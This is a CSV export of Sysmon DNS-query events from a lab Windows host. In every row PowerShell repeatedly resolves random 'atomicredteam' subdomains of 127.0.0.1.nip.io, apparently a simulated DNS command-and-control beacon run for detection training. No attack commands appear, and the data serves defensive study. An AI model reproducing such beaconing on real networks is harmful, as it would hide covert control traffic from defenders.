"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166218,"Query: atomicredteam-574157.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.752","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.156 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166219,"Query: atomicredteam-716066.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.157 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166220,"Query: atomicredteam-711902.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:02.972","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.157 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166221,"Query: atomicredteam-841252.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.157 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166222,"Query: atomicredteam-407884.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.056","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.157 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166223,"Query: atomicredteam-3058.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.097","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:03.157 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166224,"Query: atomicredteam-258147.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.167 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166225,"Query: atomicredteam-552761.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166226,"Query: atomicredteam-899394.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.224","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166227,"Query: atomicredteam-898225.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.392","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166228,"Query: atomicredteam-446950.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.434","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166229,"Query: atomicredteam-85618.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.476","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.169 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166230,"Query: atomicredteam-948010.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.516","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:04.169 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166231,"Query: atomicredteam-42668.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.558","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:05.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166232,"Query: atomicredteam-648615.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.601","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:05.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166233,"Query: atomicredteam-71616.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:03.645","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:05.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166234,"Query: atomicredteam-92422.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.021","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:05.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166235,"Query: atomicredteam-491795.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:05.168 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166236,"Query: atomicredteam-711173.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.105","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:06.173 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166237,"Query: atomicredteam-220717.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.147","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:06.173 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166238,"Query: atomicredteam-25023.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.473","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:06.174 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166239,"Query: atomicredteam-393217.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:06.174 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166240,"Query: atomicredteam-847741.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.562","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.174 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166241,"Query: atomicredteam-981767.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.884","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166242,"Query: atomicredteam-245300.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:05.925","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166243,"Query: atomicredteam-529583.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.244","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166244,"Query: atomicredteam-341971.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.286","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.175 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166245,"Query: atomicredteam-194340.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.331","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166246,"Query: atomicredteam-952097.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.651","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166247,"Query: atomicredteam-323404.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.695","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166248,"Query: atomicredteam-319775.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.740","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166249,"Query: atomicredteam-9245.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.784","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166250,"Query: atomicredteam-517085.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:06.956","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:07.177 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166251,"Query: atomicredteam-36281.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.181 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166252,"Query: atomicredteam-867022.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.171","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.181 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166253,"Query: atomicredteam-90799.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.215","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.181 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166254,"Query: atomicredteam-297047.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.260","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.181 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166255,"Query: atomicredteam-890070.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.304","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.182 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166256,"Query: atomicredteam-321411.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.348","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.182 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166257,"Query: atomicredteam-814038.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.393","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.182 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166258,"Query: atomicredteam-525228.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.437","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.182 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166259,"Query: atomicredteam-158324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.480","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166260,"Query: atomicredteam-26490.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.524","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166261,"Query: atomicredteam-834044.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.568","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166262,"Query: atomicredteam-888094.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:07.888","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:08.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166263,"Query: atomicredteam-34377.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.069","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166264,"Query: atomicredteam-367723.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.113","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166265,"Query: atomicredteam-962411.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.156","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:09.183 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166266,"Query: atomicredteam-36374.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:59:08.201","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
